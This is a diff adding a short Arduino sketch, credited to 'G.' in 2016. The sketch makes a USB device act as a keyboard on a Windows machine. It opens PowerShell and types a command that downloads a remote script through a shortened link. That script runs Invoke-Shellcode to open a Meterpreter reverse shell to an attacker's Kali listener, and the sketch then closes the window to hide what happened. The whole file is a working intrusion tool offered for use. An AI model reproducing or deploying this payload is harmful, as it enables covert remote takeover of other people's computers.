@@ -1,0 +1,58 @@
+/* Made by G. on August 10, 2016 
+  (Use this code as you will but *try* not to get 
+  in trouble. I will not be responsible for your misdemeanours.)
+  Also, keep this comment in any reproductions you make or at the
+  very minimum, give me *some* credit.
+  Make sure your have a listener "listening" on your Kali System
+  with the exploit of exploit/multi/handler, payload of 
+  windows/meterpreter/reverse_http and the same settings 
+  (of LHOST and LPORT) as on line 41.
+*/
+
+#include <Keyboard.h>
+
+int once = 1;
+
+void setup()
+{
+    Keyboard.begin(); //Initiate keyboard.
+}
+
+
+void loop()
+
+{
+  
+  while(once == 1)
+  {
+    
+    delay(20); //Allow time to initialise.
+    Keyboard.press(KEY_LEFT_GUI); //Press the windows shortcut button.
+    Keyboard.releaseAll();
+    delay(15);
+    Keyboard.print("powershell"); //Search for powershell (possible to make quicker by searching for "powersh" etc.
+    delay(100);                   //instead, but can become useless if user has a similarly named application).
+    
+    Keyboard.press(KEY_RETURN); //Open it.
+    delay(30);
+    Keyboard.releaseAll();
+    delay(100);
+
+    Keyboard.print("IEX(New-Object Net.WebClient).DownloadString('http://bit.ly/14bZZ0c');Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost 127.0.0.1 -Lport 4444 -Force"); //Enter Payload.
+    delay(100); //IMPORTANT NOTE: You must change the LHOST and LPORT in the above command for your own.
+
+    Keyboard.press(KEY_RETURN); //PWNED.
+    Keyboard.releaseAll();
+    delay(30);
+
+    Keyboard.print("exit"); //Exit from powershell and pretend that nothing happened ;)
+    delay(50);
+    Keyboard.press(KEY_RETURN);
+    delay(30);
+    Keyboard.releaseAll();
+
+    once = once + 1; //End the while loop
+  
+  }
+
+}
